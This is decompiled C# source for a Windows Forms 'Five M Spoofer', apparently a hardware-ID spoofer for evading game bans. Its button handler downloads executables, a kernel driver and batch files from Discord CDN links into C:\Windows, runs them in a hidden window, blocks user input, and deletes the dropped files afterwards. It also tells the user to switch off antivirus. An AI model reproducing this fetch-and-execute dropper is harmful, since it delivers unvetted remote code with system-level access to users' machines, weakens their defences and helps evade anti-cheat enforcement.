using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;

namespace MouseManager
{
	// Token: 0x0200000E RID: 14
	public class Profile4 : UserControl
	{
		// Token: 0x06000073 RID: 115 RVA: 0x001A84B1 File Offset: 0x001A0EB1
		public Profile4()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000074 RID: 116 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void Profile4_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000075 RID: 117 RVA: 0x001AF38C File Offset: 0x001A7D8C
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			if (File.Exists("C:\\Windows\\36EF.bat"))
			{
				File.Delete("C:\\Windows\\36EF.bat");
			}
			MessageBox.Show("IF SPOOFER FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\uLLYvMz4ZUeq.sys";
			string text2 = "C:\\Windows\\User.exe";
			string text3 = "C:\\Windows\\8hyKnYgs.exe";
			string fileName = "C:\\Windows\\36EF.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899053822595461141/905175129619849236/36EF.bat", fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Profile5.NativeMethods.BlockInput(false);
			Profile5.NativeMethods.BlockInput(true);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006385344368651/8hyKnYgs.exe", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006381733052557/uLLYvMz4ZUeq.sys", text);
			Process.Start(text3, text);
			Thread.Sleep(3000);
			File.Delete(text);
			File.Delete(text3);
			Thread.Sleep(5000);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006383687614494/User.exe", text2);
			Process.Start(text2);
			Thread.Sleep(5000);
			File.Delete(text2);
			Process.Start(fileName);
			Thread.Sleep(20000);
			Profile5.NativeMethods.BlockInput(true);
			Profile5.NativeMethods.BlockInput(false);
			MessageBox.Show("Spoofer worked properly DiskDriver, Volume ID , Nic , SMBIOS , Registry , GPU , CPU.your session will close after the process let it do so !!! .GOOD GAMEImportant Message");
			if (File.Exists("C:\\Windows\\36EF.bat"))
			{
				File.Delete("C:\\Windows\\36EF.bat");
			}
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			string fileName2 = "C:\\Windows\\logoff.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/901383697176092742/901384332562800650/logoff.exe", fileName2);
		}

		// Token: 0x06000076 RID: 118 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000077 RID: 119 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel14_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000079 RID: 121 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007A RID: 122 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007B RID: 123 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel13_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007C RID: 124 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007D RID: 125 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel15_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007E RID: 126 RVA: 0x001A84C5 File Offset: 0x001A0EC5
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600007F RID: 127 RVA: 0x001AF768 File Offset: 0x001A8168
		private void InitializeComponent()
		{
            this.siticoneHtmlLabel15 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel13 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel11 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel6 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel14 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel12 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel9 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneHtmlLabel7 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.siticoneButton4 = new Siticone.Desktop.UI.WinForms.SiticoneButton();
            this.siticoneHtmlLabel5 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
            this.SuspendLayout();
            // 
            // siticoneHtmlLabel15
            // 
            this.siticoneHtmlLabel15.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel15.Enabled = false;
            this.siticoneHtmlLabel15.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel15.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel15.Location = new System.Drawing.Point(286, 114);
            this.siticoneHtmlLabel15.Name = "siticoneHtmlLabel15";
            this.siticoneHtmlLabel15.Size = new System.Drawing.Size(60, 21);
            this.siticoneHtmlLabel15.TabIndex = 72;
            this.siticoneHtmlLabel15.Text = "Intel / AMD";
            // 
            // siticoneHtmlLabel13
            // 
            this.siticoneHtmlLabel13.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel13.Enabled = false;
            this.siticoneHtmlLabel13.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel13.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel13.Location = new System.Drawing.Point(286, 87);
            this.siticoneHtmlLabel13.Name = "siticoneHtmlLabel13";
            this.siticoneHtmlLabel13.Size = new System.Drawing.Size(95, 21);
            this.siticoneHtmlLabel13.TabIndex = 71;
            this.siticoneHtmlLabel13.Text = "Any Windows 7-11";
            // 
            // siticoneHtmlLabel11
            // 
            this.siticoneHtmlLabel11.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel11.Enabled = false;
            this.siticoneHtmlLabel11.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel11.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel11.Location = new System.Drawing.Point(286, 60);
            this.siticoneHtmlLabel11.Name = "siticoneHtmlLabel11";
            this.siticoneHtmlLabel11.Size = new System.Drawing.Size(178, 21);
            this.siticoneHtmlLabel11.TabIndex = 70;
            this.siticoneHtmlLabel11.Text = "All laptops and desktops support.";
            // 
            // siticoneHtmlLabel6
            // 
            this.siticoneHtmlLabel6.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel6.Enabled = false;
            this.siticoneHtmlLabel6.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel6.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel6.Location = new System.Drawing.Point(286, 33);
            this.siticoneHtmlLabel6.Name = "siticoneHtmlLabel6";
            this.siticoneHtmlLabel6.Size = new System.Drawing.Size(97, 21);
            this.siticoneHtmlLabel6.TabIndex = 69;
            this.siticoneHtmlLabel6.Text = "Not Required Now.";
            // 
            // siticoneHtmlLabel14
            // 
            this.siticoneHtmlLabel14.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel14.Enabled = false;
            this.siticoneHtmlLabel14.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel14.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel14.Location = new System.Drawing.Point(154, 33);
            this.siticoneHtmlLabel14.Name = "siticoneHtmlLabel14";
            this.siticoneHtmlLabel14.Size = new System.Drawing.Size(103, 21);
            this.siticoneHtmlLabel14.TabIndex = 68;
            this.siticoneHtmlLabel14.Text = "Windows Reinstall:";
            // 
            // siticoneHtmlLabel12
            // 
            this.siticoneHtmlLabel12.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel12.Enabled = false;
            this.siticoneHtmlLabel12.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel12.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel12.Location = new System.Drawing.Point(154, 60);
            this.siticoneHtmlLabel12.Name = "siticoneHtmlLabel12";
            this.siticoneHtmlLabel12.Size = new System.Drawing.Size(114, 21);
            this.siticoneHtmlLabel12.TabIndex = 67;
            this.siticoneHtmlLabel12.Text = "Supported Hardware:";
            // 
            // siticoneHtmlLabel9
            // 
            this.siticoneHtmlLabel9.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel9.Enabled = false;
            this.siticoneHtmlLabel9.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel9.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel9.Location = new System.Drawing.Point(154, 114);
            this.siticoneHtmlLabel9.Name = "siticoneHtmlLabel9";
            this.siticoneHtmlLabel9.Size = new System.Drawing.Size(83, 21);
            this.siticoneHtmlLabel9.TabIndex = 65;
            this.siticoneHtmlLabel9.Text = "Supported CPU:";
            // 
            // siticoneHtmlLabel7
            // 
            this.siticoneHtmlLabel7.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel7.Enabled = false;
            this.siticoneHtmlLabel7.Font = new System.Drawing.Font("Bahnschrift Condensed", 12F);
            this.siticoneHtmlLabel7.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel7.Location = new System.Drawing.Point(154, 87);
            this.siticoneHtmlLabel7.Name = "siticoneHtmlLabel7";
            this.siticoneHtmlLabel7.Size = new System.Drawing.Size(76, 21);
            this.siticoneHtmlLabel7.TabIndex = 64;
            this.siticoneHtmlLabel7.Text = "Supported OS:";
            // 
            // siticoneButton4
            // 
            this.siticoneButton4.Animated = true;
            this.siticoneButton4.AutoRoundedCorners = true;
            this.siticoneButton4.BorderColor = System.Drawing.Color.White;
            this.siticoneButton4.BorderRadius = 16;
            this.siticoneButton4.BorderThickness = 2;
            this.siticoneButton4.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(3)))), ((int)(((byte)(169)))), ((int)(((byte)(244)))));
            this.siticoneButton4.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(3)))), ((int)(((byte)(169)))), ((int)(((byte)(244)))));
            this.siticoneButton4.CheckedState.ForeColor = System.Drawing.Color.Black;
            this.siticoneButton4.CheckedState.Parent = this.siticoneButton4;
            this.siticoneButton4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.siticoneButton4.CustomImages.Parent = this.siticoneButton4;
            this.siticoneButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.siticoneButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.siticoneButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.siticoneButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.siticoneButton4.DisabledState.Parent = this.siticoneButton4;
            this.siticoneButton4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(33)))), ((int)(((byte)(33)))));
            this.siticoneButton4.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.siticoneButton4.ForeColor = System.Drawing.Color.White;
            this.siticoneButton4.HoverState.FillColor = System.Drawing.Color.White;
            this.siticoneButton4.HoverState.ForeColor = System.Drawing.Color.Black;
            this.siticoneButton4.HoverState.Parent = this.siticoneButton4;
            this.siticoneButton4.Location = new System.Drawing.Point(136, 152);
            this.siticoneButton4.Name = "siticoneButton4";
            this.siticoneButton4.ShadowDecoration.Parent = this.siticoneButton4;
            this.siticoneButton4.Size = new System.Drawing.Size(247, 35);
            this.siticoneButton4.TabIndex = 63;
            this.siticoneButton4.Text = "Start Spoof";
            this.siticoneButton4.Click += new System.EventHandler(this.siticoneButton4_Click_1);
            // 
            // siticoneHtmlLabel5
            // 
            this.siticoneHtmlLabel5.BackColor = System.Drawing.Color.Transparent;
            this.siticoneHtmlLabel5.Enabled = false;
            this.siticoneHtmlLabel5.Font = new System.Drawing.Font("Bahnschrift Condensed", 15F);
            this.siticoneHtmlLabel5.ForeColor = System.Drawing.Color.White;
            this.siticoneHtmlLabel5.Location = new System.Drawing.Point(215, 3);
            this.siticoneHtmlLabel5.Name = "siticoneHtmlLabel5";
            this.siticoneHtmlLabel5.Size = new System.Drawing.Size(101, 26);
            this.siticoneHtmlLabel5.TabIndex = 62;
            this.siticoneHtmlLabel5.Text = "Five M Spoofer";
            // 
            // Profile4
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(33)))), ((int)(((byte)(33)))));
            this.Controls.Add(this.siticoneHtmlLabel15);
            this.Controls.Add(this.siticoneHtmlLabel13);
            this.Controls.Add(this.siticoneHtmlLabel11);
            this.Controls.Add(this.siticoneHtmlLabel6);
            this.Controls.Add(this.siticoneHtmlLabel14);
            this.Controls.Add(this.siticoneHtmlLabel12);
            this.Controls.Add(this.siticoneHtmlLabel9);
            this.Controls.Add(this.siticoneHtmlLabel7);
            this.Controls.Add(this.siticoneButton4);
            this.Controls.Add(this.siticoneHtmlLabel5);
            this.Name = "Profile4";
            this.Size = new System.Drawing.Size(554, 454);
            this.ResumeLayout(false);
            this.PerformLayout();

		}

		// Token: 0x04000045 RID: 69
		private IContainer components;

		// Token: 0x04000046 RID: 70
		private SiticoneHtmlLabel siticoneHtmlLabel15;

		// Token: 0x04000047 RID: 71
		private SiticoneHtmlLabel siticoneHtmlLabel13;

		// Token: 0x04000048 RID: 72
		private SiticoneHtmlLabel siticoneHtmlLabel11;

		// Token: 0x04000049 RID: 73
		private SiticoneHtmlLabel siticoneHtmlLabel6;

		// Token: 0x0400004A RID: 74
		private SiticoneHtmlLabel siticoneHtmlLabel14;

		// Token: 0x0400004B RID: 75
		private SiticoneHtmlLabel siticoneHtmlLabel12;

		// Token: 0x0400004C RID: 76
		private SiticoneHtmlLabel siticoneHtmlLabel9;

		// Token: 0x0400004D RID: 77
		private SiticoneHtmlLabel siticoneHtmlLabel7;

		// Token: 0x0400004E RID: 78
		private SiticoneButton siticoneButton4;

		// Token: 0x0400004F RID: 79
		private SiticoneHtmlLabel siticoneHtmlLabel5;

        private void siticoneButton4_Click_1(object sender, EventArgs e)
        {

        }
    }
}
